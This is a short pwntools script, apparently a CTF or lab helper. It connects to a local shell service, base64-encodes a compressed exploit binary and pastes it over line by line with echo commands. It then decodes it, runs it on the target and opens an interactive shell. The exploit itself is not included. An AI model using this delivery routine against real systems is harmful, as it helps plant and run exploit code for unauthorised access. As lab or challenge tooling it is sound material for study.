from pwn import *
import time, os
context.log_level = "debug"

p = remote("127.0.0.1", 5555)

os.system("tar -czvf exp.tar.gz ./exp") # compress exp
os.system("base64 exp.tar.gz > b64_exp") # base64 encode exp.tar.gz

f = open("./b64_exp", "r")

p.recvuntil("/ # ")
p.sendline("echo '' > b64_exp;")

while True:
    line = f.readline().replace("\n","")
    if len(line)<=0:
        break
    cmd = b"echo '" + line.encode() + b"' >> b64_exp;"
    p.sendline(cmd) # send lines
    time.sleep(0.3)
    p.recv()
f.close()

p.sendline("base64 -d b64_exp > exp.tar.gz;tar -xzvf exp.tar.gz; chmod +x exp;/exp;")
p.interactive()
